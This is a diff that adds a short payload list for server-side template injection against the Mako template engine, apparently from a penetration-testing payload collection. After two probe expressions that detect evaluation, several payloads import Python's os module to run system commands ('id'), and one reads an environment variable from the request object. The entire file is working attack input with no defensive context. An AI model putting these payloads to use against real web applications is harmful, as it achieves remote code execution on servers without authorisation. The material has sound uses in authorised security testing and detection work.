@@ -1,0 +1,8 @@
+# SSTI - Mako Payloads
+${7*7}
+${7*'7'}
+<% import os %>${os.system('id')}
+<%! import os %>
+${__import__('os').popen('id').read()}
+<%namespace name="os" file="os" />
+<% x = request;y = x.environ;z = y.get('PATH') %>${z}
